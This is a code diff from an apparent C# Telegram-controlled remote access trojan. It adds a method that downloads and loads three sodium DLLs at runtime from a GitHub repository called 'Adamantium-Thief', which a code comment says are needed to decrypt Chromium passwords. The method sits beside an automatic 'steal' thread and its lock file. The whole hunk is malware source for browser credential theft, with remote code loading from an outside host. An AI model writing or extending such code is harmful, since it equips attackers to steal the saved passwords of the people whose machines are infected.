@@ -10,6 +10,15 @@ namespace TelegramRAT
         public static Thread AutoStealerThread = new Thread(steal);
         private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";
 
+        // Check dll's before decryption chromium passwords
+        public static void loadDlls()
+        {
+            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
+            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
+            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
+        }
+
+        // Steal
         private static void steal()
         {
             // If disabled in config
